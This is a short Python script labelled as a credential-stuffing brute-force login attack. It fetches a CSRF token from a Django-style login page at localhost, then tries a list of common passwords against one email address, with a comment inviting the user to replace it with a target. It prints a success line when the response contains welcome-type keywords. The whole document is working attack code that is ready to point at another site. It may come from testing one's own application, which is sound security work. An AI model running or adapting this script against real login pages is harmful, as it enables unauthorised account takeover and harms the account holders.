import requests
from bs4 import BeautifulSoup

# 1️⃣ Credential Stuffing Attack - Brute Force Login
LOGIN_URL = "http://127.0.0.1:8000/login/"
password_list = ["password123", "admin", "123456", "letmein", "qwerty", "admin123", "admin@123"]
email = "admin@gmail.com"  # Replace with target email

# Get CSRF token
session = requests.Session()
login_page = session.get(LOGIN_URL)
soup = BeautifulSoup(login_page.content, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

for password in password_list:
    data = {
        "email": email,
        "password": password,
        "csrfmiddlewaretoken": csrf_token
    }
    response = session.post(LOGIN_URL, data=data, headers={"Referer": LOGIN_URL})
    print(f"Trying {email}:{password} - Response: {response.text}")
    if any(keyword in response.text.lower() for keyword in ["welcome", "successful", "logged in", "hello"]):
        print(f"[+] Success: {email} -> {password}")
        break